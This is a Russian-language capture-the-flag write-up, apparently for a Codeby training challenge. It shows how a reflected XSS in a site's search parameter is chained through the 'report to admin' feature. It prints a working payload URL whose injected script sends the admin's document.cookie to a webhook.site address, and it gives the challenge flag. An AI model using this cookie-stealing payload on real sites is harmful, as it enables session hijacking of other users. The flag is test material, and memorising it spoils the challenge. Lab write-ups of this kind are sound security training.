# Клиент всегда прав

При входе на сайт видим строку поиска и три публикации, на которые можно отправить репорт

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Client_Always_Right/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5.png?raw=true)

Проверяем сайт на наличие XSS уязвимости. Проверка показывает положительный результат

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Client_Always_Right/Screenshot_137.png?raw=true)

## Пробуем атаковать

Кнопка репорта отправляет публикацию администратору, причём в адресной строке можно заметить полную ссылку на публикацию. Прямая попытка ввода скрипта в репорт результата не даёт

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Client_Always_Right/Screenshot_138.png?raw=true)

Создаём сессию на `webhook.site`, на неё мы будем принимать результаты запроса

![](https://github.com/Ezhidze25/Forbidden_Code_HW/blob/main/Client_Always_Right/Screenshot_139.png?raw=true)

Изменим ссылку репорта, на ссылку страницы поиска с внедрённым пейлоадом. Итоговая ссылка будет выглядеть так
>http://62.173.140.174:16013/?report=http://62.173.140.174:16013/?search=<script>document.location='https://webhook.site/a2b7f0c7-8ea3-44a8-ba64-927c4c4d1927/?cookie='%252BencodeURIComponent(document.cookie)</script>

Вставляем её в адресную строку, получаем отстук на webhook:

![](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/b859bede-91a6-4c5d-add7-86f7e31a59b0)

Флаг получен: ***CODEBY{r3fl3cted_XSS_expl0it3d}***
